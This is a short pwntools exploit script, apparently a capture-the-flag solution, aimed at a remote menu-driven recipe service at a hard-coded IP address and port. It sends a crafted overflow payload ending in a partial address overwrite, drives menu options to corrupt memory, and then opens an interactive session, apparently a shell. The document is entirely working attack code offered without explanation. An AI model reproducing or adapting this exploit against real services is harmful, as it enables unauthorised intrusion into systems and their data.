from pwn import *

r = remote("34.207.98.167", 1414)

r.recvuntil("choice :")
r.sendline("5")
r.recvuntil("ingredient : ")

payload = "\0" + "A"*0x5b + p32(0xffffffff) + "\xc0\x11"
r.send(payload)

r.recvuntil("choice :")
r.sendline("1")
r.recvuntil(" name :")
r.sendline("AAAA")
r.recvuntil("ingredients : ")
r.sendline("1")
r.recvuntil("ingredients : ")
r.sendline("99")

r.recvuntil("choice :")
r.sendline("3")
r.recvuntil("change :")
r.sendline("0")
r.recvuntil("change :")
r.sendline("2")
r.recvuntil("remove :")
r.sendline("21")

r.interactive()
